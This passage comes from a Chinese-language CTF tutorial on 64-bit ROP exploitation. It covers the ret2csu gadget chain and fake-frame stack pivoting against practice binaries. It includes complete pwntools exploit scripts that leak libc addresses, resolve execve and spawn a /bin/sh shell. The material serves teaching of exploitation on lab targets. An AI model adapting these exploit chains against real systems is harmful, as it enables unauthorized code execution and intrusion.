    def csu(rbx, rbp, r12, r13, r14, r15, last):
        # pop rbx,rbp,r12,r13,r14,r15
        # rbx should be 0,
        # rbp should be 1,enable not to jump
        # r12 should be the function we want to call
        # in my case, is the following case.
        # rdi=edi=r13d
        # rsi=r14
        # rdx=r15
        payload = 'a' * 128 + fakeebp # 128 offset to rbp, then 8 bytes to the ret_addr.
        ## put the address of the gadget 1
        payload += p64(csu_end_addr)
        payload += 'a'* 8 ## suplement for the additional rsp addition. i.e., add rsp, 38h.
        payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
        ## then put the address of the gadget 2, to call function
        payload += p64(csu_front_addr)
        payload += 'a' * 0x38 
        payload += p64(last)
        sh.send(payload)
        sleep(1)
    #gdb.attach(sh)
    sh.recvuntil('Hello, Worldn')
    ## write(1,write_got,8)
    csu(0, 1, write_got, 1, write_got, 8, main_addr)
    # sh.recvuntil('Hello, Worldn')
    write_addr = u64(sh.recv(8))
    print "write_addr, ", hex(write_addr), write_addr
    libc = LibcSearcher('write', write_addr)
    libc_base = write_addr - libc.dump('write')
    execve_addr = libc_base + libc.dump('execve')
    log.success('execve_addr ' + hex(execve_addr))
    ####--- orignal test.
    ## read(0,bss_base,16)
    ## read execve_addr and /bin/shx00
    sh.recvuntil('Hello, Worldn')
    csu(0, 1, read_got, 0, bss_base, 16, main_addr)
    sh.send(p64(execve_addr) + '/bin/shx00')
    sh.recvuntil('Hello, Worldn')
    ## execve(bss_base+8)
    csu(0, 1, bss_base, bss_base + 8, 0, 0, main_addr)
    sh.interactive()
###  每次调用csu时栈的分布和相关寄存器变化
**调用write_got泄露write_got地址的栈**
    csu(0, 1, write_got, 1, write_got, 8, main_addr)
序号后面的寄存器内容表示，执行完对应指令后，寄存器的变化。
标记红色的为关键的模块。
包括如何将栈中的地址映射到不同的寄存器中；再到寄存器赋值到64位程序输入参数中；最后到利用callq调用程序；最后修正rsp的指针，来跳转到主函数位置。
**调用read_got将字符串/bin/sh加载到bss段中**
    csu(0, 1, read_got, 0, bss_base, 16, main_addr)
此处部分的栈布置和前述利用write[@got](https://github.com/got
"@got")泄露write[@got](https://github.com/got
"@got")差不多。只是callq调用的函数变成了read[@got](https://github.com/got "@got")。输入的参数变成了0,
bss_base, 16.表示向地址bss_base输入16个字节。
**调用execve执行获得shell**
    csu(0, 1, bss_base, bss_base + 8, 0, 0, main_addr)
此处的bss_base地址中已经存储了execve的地址。注意，由于callq
调用时，是去除目标地址指向的地址来调用函数，因此需要借助bss_base来转储一下内容。即callq [bss_base]=callq
execve_address。否则是不会成功的。
运行时注意选择64位的libc库。即第0个选项。
这里解释一下，为什么在放完gadget 2地址之后，要padding 0x38个数据。才能够放入返回地址。
    payload += 'a' * 0x38
这是因为在执行完callq之后，我们会使得程序往后执行，且不进行跳转。从而可以最终执行到0x400628位置的retn函数，调用到我们布置的main函数，重新开始执行漏洞。我们在csu中设置了rbx=0,
rbp=1.从而在执行到0x4005fd的时候，rbx加1，和rbp相等，从而不会执行跳转。继续往后执行，在到达retn之前，0x400624执行了add
rsp, 38h的操作，将栈接着抬高了0x38，所以我们需要padding 0x38的数据，才能够让pwn8程序成功获取我们布置的返回地址。
同时，也由上图也可以看出为什么在放置了csu_end_addr之后，不是直接放置rbx参数的地址。因为[rsp+38h_var_30]，可以发现该指令取参数是在当前的rsp基础上增加了8的。因此需要padding
8个‘a’。
## fake frame应对有限的溢出空间
上述64位的ROP是不是看起来已经很完美了？大家是不是跃跃欲试的想要带着上面这把“屠龙霸刀”到处找64位程序来练练手？恩，怕是要“欲试未半而中道崩殂”了。
看官且瞅瞅我这道菜。
[pwn9](https://github.com/desword/pwn_execrise/blob/master/pwn_basic_rop_3/pwn9)
让我们继续快速三连
###  快速三连：查保护，查漏洞，算偏移
仅仅开启了NX。
存在漏洞的是read函数。Buf仅仅申请了0x50个字节长度，然而read允许读取0x60个字节长度。
    $ python getOverFlowOffset.py 0x00000000004006BF ~/pwn_execrise/pwn_basic_rop_3/pwn9
    [*] /home/desword/pwn_execrise/pwn_basic_rop_3/pwn9 is 64 bits
    [*] no PIE
    [+] Found offset to the EBP is 80.
    [+] THe offset to the RET_ADDR is 84 (32bits) or 88 (64bits).
距离EBP的偏移是80个字节，返回地址是88个字节。
**发现**
：有没有发现奇怪的点。对！能够允许溢出的长度非常有限，仅仅16个字节，刚好两个寄存器的长度。那么也就仅仅够覆盖EBP和返回地址了。我们看看前面ret2csu的构造，在溢出之后，需要很多字节来部署寄存器rdi,
rsi,
rdx的值，还要处理调用完函数之后0x38个字节的padding。因此，ret2csu无法直接使用了。我们也可以就此总结，ret2csu虽然通用，但是需要有较大的溢出空间。
怎么办呢？
这里介绍一种fake frame的方式，可以在溢出空间有限的时候，实现ROP。
在介绍这个操作之前，先给大家介绍两个汇编指令：leave和ret。
Leave指令相当于
    mov rsp, rbp
    pop rbp
Ret指令相当于：
    pop rip
###  Fake frame 基本思路
一般程序的结束都是leave;retn。如果我们溢出的返回地址同样还是leave;retn，会发生什么呢？我们把两个leave;
retn分别转换成上述解释的操作，来一一解释流程。
序号表示，执行完对应指令的操作之后，寄存器的变化情况。
可以发现，在初始栈中原来放置ebp的位置布置成未来要跳转的新的函数块的起始地址，可以将当前的rsp引导过去。而在目标地址的起始位置开始安装如下规律布置内容，就可以连续的调用自己想要的函数，且输入的参数长度可以自定义。
即： fake_frame_i | 要执行的函数地址 | leave ret 地址 | 参数1 | 参数2 | …
其中步骤1~3是原始程序中的leave; ret；后续的4~6是新增加的gadget里面的leave; ret。
###  完整的EXP
基于上述总结的思路，我们就可以构造下面完整的EXP了。
    from pwn import *
    from LibcSearcher import *
    context.binary = "./pwn9"
    def DEBUG(cmd):
        gdb.attach(io, cmd)
    io = process("./pwn9")
    elf = ELF("./pwn9")
    # DEBUG("b *0x4006B9nc")
    io.sendafter(">", 'a' * 80)
    stack = u64(io.recvuntil("x7f")[-6: ].ljust(8, '')) - 0x70
    success("stack -> {:#x}".format(stack))
    io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
    put_addr = u64(io.recvuntil("x7f")[-6: ].ljust(8, ''))
    libcmy = LibcSearcher('puts', put_addr)
    libc_base = put_addr - libcmy.dump('puts')
    execve_addr = libc_base + libcmy.dump('execve')
    binsh_addr = libc_base + libcmy.dump("str_bin_sh")
    success("libcmy.address -> {:#x}".format(libc_base))
    pop_rdi_ret=0x400793
    '''
    $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
    0x00000000000f5279 : pop rdx ; pop rsi ; ret
    #  need to be ajusted considering current libc.
    '''
    pop_rdx_pop_rsi_ret=libc_base+0x00000000001306d9
    payload=flat(['22222222', p64(pop_rdi_ret), p64(binsh_addr), p64(pop_rdx_pop_rsi_ret),p64(0),p64(0), p64(execve_addr), (80 - 7*8 ) * '2', stack - 48, 0x4006be])
    io.sendafter(">", payload)
    io.interactive()
首次的溢出是为了让puts函数输出栈中存储的rsp的值。
###  每部分内容的栈布置和相关寄存器变化。
**为了输出puts[@got](https://github.com/got "@got")的地址，栈分布情况**
    io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
其中0x400793，用于pop第一个输入参数rdi。借助ROPgadget找到：
其中0x400676是用于重新载入有漏洞的read函数的。
其后填充40个字节，是由于前面已经有5*8的位置占用了。
0x4006be是leaver ret的地址。
**为了执行execve(“/bin/sh”,0 ,0)的栈分布情况** :
    payload=flat(['22222222', p64(pop_rdi_ret), p64(binsh_addr), p64(pop_rdx_pop_rsi_ret),p64(0),p64(0), p64(execve_addr), (80 - 7*8 ) * '2', stack - 48, 0x4006be])
其中：
pop_rdx_pop_rsi_ret=libc_base+0x00000000001306d9
这个部分的地址需要自己借助ROPgadget等工具来找到并且更新，不同机器会不一样。
这里需要解释一下为什么在执行execve的时候，需要stack-48,降低栈的高度来引rsp。
    stack - 48
这是因为，在第一次泄露puts[@got](https://github.com/got
"@got")函数地址，返回到带有漏洞的函数（即0x4000676）继续执行时，存在会改变rsp数值的操作。Rsp改变了，也就导致了溢出的数据做处的位置也发生了改变，如果不进行调整，将无法跳转到正确的位置。我们发现在0x4000676有两处操作改变了rsp的数值。
    Push rbp, 我们得到stack + 40 -8 = stack +32  
    Sub rsp, 50h, 我们得到stack + 32 – 0x50 = stack – 48
后期跟进栈平衡原则，rsp的内容不会再有变化了。所以，我们这个时候输入payload数据会载入到rsp-48的位置，那么我们代码跳转的位置也需要响应的调整。
执行结果：
最后，照旧给大家留一道练习题来巩固一下。 我们下期见。
[Pwn10](https://github.com/desword/pwn_execrise/blob/master/pwn_basic_rop_3/pwn10)
参考资料：